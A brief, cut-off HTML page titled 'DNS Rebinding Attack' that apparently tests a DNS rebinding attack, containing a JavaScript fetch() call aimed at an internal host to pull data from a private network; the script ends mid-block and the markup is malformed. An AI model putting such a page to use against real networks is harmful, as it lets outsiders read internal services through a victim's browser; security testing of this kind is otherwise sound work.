<!DOCTYPE html>
<html lang="en">

    <title>DNS Rebinding Attack</title>
</head>
<body>
    <h1>Testing DNS Rebinding</h1>
    <p>Trying to fetch data from internal network.</p>

        fetch('http://puppet-01.enlisted.net/')

            .then(data => {
